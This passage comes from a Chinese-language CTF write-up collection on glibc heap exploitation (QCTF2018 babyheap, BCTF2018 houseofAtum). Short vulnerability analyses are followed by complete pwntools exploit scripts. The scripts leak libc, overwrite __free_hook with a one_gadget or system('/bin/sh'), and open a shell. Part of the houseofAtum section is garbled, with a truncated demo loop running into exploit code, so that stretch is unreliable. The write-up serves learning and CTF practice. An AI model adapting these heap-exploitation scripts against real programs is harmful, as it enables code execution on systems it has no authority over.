        delete(0)
        delete(5)
        new(0x500-0x9+0x34, "b")
        delete(4)
        new(0xa8, '\x60\x07')
        new(0x40, 'c')
        new(0x3e, p64(0xfbad1800) + p64(0) * 3 + '\x08')
        libc_base = u64(io.recv(8)) - 0x3ed8b0      # u64(_IO_stdfile_2_lock) - libc.symbols['__free_hook'] + 0x38
        malloc_hook = libc_base + libc.symbols['__malloc_hook']
        free_hook = libc_base + libc.symbols['__free_hook']
        one_gadget = [0x4f2c5, 0x4f322, 0x10a38c]
        one_gadget = libc_base + one_gadget[1]
        io.success("libc_base = "+hex(libc_base))
        io.success("malloc_hook = "+hex(malloc_hook))
        io.success("free_hook = "+hex(free_hook))
        io.success("one_gadget = " +hex(one_gadget))
        new(0xa0, p64(free_hook))
        new(0x60, p64(1))
        new(0x60, p64(one_gadget))
        # gdb.attach(io)
        delete(0)
        io.interactive()
    if __name__ == '__main__':
        pwn(ip, port, 1)
## [QCTF2018
babyheap](https://github.com/fangdada/ctf/tree/master/QCTF2018/babyheap)
### 分析
保护全开  
菜单：
    1. Create
    2. Delete
    3. show
    4. Exit
存在`NULL Byte off-by-one`漏洞
经过上面两道题，其实思路已经很清晰了。
### exp
    #!usr/bin/python
    from pwn import *
    context.log_level = 'debug'
    binary = "./babyheap"
    ip = ""
    port = 0
    elf = ELF(binary)
    def menu(choice):
        io.sendlineafter("choice :", str(choice))
    def create(size, data):
        menu(1)
        io.sendlineafter("Size: \n", str(size))
        io.sendafter("Data: \n", data)
    def delete(idx):
        menu(2)
        io.sendlineafter("Index: \n", str(idx))
    def show():
        menu(3)
    def pwn(ip, port, debug):
        global io
        if debug == 1:
            io = process(binary)
            libc = ELF("./libc-2.27.so")
        else:
            io = remote(ip, port)
            libc = 0
        create(0x418, 'a\n')    # 0 
        create(0x508, 'b' * 0x4f0 + p64(0x500) + '\n')  # 1
        create(0x418, 'c\n')    # 2
        create(0x418, 'd\n')    # 3
        delete(0)
        delete(1)
        create(0x418, 'e' * 0x418)  # 0
        create(0x418, 'f\n')    # 1
        create(0xd8, 'g\n')     # 4
        delete(1)
        delete(2)
        create(0x418, 'h\n')    # 1
        show()
        io.recvuntil("4 : ")
        libc_base = u64(io.recv(6).ljust(8, '\x00')) - 0x3ebca0
        free_hook = libc_base + libc.sym['__free_hook']
        malloc_hook = libc_base + libc.sym['__malloc_hook']
        # onegadget = [0x4f2c5, 0x4f322, 0x10a38c]
        # onegadget = libc_base + onegadget[1]
        sys_addr = libc_base + libc.sym['system']
        print "libc_base = " +hex(libc_base)    # 0x7ffff79e4000
        print "free_hook = " +hex(free_hook)    # 0x7ffff7dd18e8
        print "sys_addr = " +hex(sys_addr)      # 0x7ffff7a33440
        create(0xd8, '\n')      # 2
        delete(4)
        delete(2)
        create(0xd8, p64(free_hook) + '\n')     # 4
        # create(0xd8, p64(onegadget) + '\n')
        create(0xd8, '/bin/sh\x00' + '\n')      # 2
        create(0xd8, p64(sys_addr) + '\n')
        delete(2)
        io.interactive()
    if __name__ == '__main__':
        pwn(ip, port, 1)
one_gadget有时候不符合条件不能使用，我们替换成system("/bin/sh")
## [BCTF2018 houseofAtum](https://github.com/WinMin/CTF-Writeup/tree/master/2018/BCTF/Pwn/houseofatum)
出题人的分析：
### 分析
保护全开  
菜单
    1. new
    2. edit
    3. delete
    4. show
只对指针进行free但是没有清零。存在`UAF`漏洞  
难点在于，只能申请两个note，不过不管你删不删都会把指针给free了  
考虑到tcache机制的缺陷，不检查size等flag，只根据fd直接分配内存给用户，所以tcache bin和fastbin的fd指向是不同的。  
通过这个小demo我们可以判断
    void *a = malloc(0x28);
    void *b = malloc(0x28);
    // fill the tcache
    for(int i=0; i a  a  0 -> 1
        payload = p64(0) * 7 + p64(0xa1) + p64(heap_base + 0x30)
        new(payload)    # 0
        new("\x30")     # 1
        delete(1, 'y')  # fd = heap_base + 0x30
        new("k1")       # 1     # heap_base + 0x30
        delete(0, 'y')
        payload = p64(0) * 7 + p64(heap_base + 0x10)
        edit(1, payload)
        new('\x11')     # prev_inuse
        for i in range(7):
            delete(0, 'n')
        delete(0, 'y')
        payload = p64(0) * 7 + p64(heap_base + 0x10)
        edit(1, payload)
        new('\x11')
        show(0)
        io.recvuntil("Content:")
        libc_base = u64(io.recv(6).ljust(8, '\x00')) + 0xc143ef     # 0x00007ffff7dcfca0 - 0x00007ffff6dcfc11 - 0x3ebca0
        print "libc_base = " +hex(libc_base)        # 0x7ffff79e4000s
        one_gadget = [0x4f2c5, 0x4f322, 0x10a38c]
        one_gadget = libc_base + one_gadget[1]
        free_hook = libc_base + libc.sym['__free_hook']
        delete(0, 'y')
        payload = p64(0) * 7 + p64(free_hook)
        edit(1, payload)
        new(p64(one_gadget))
        menu(3)
        io.sendlineafter("idx:", str(0))
        io.interactive()
    if __name__ == '__main__':
        pwn(ip, port, 1)
> 以上参考  
>  [CTF-wiki](https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-> heap/tcache_attack-zh/)  
>  [ctf-all-in-one](https://firmianay.gitbooks.io/ctf-all-in-> one/doc/4.14_glibc_tcache.html)  
>   tcache/#step-2-%E5%88%A9%E7%94%A8%E6%96%87%E4%BB%B6%E6%B5%81%E6%B3%84%E9%9C%B2libc%E7%9A%84%E5%9C%B0%E5%9D%80>  
>
>  --Pwn%E9%A2%98%E8%A7%A3(Part%202)/#babyheap>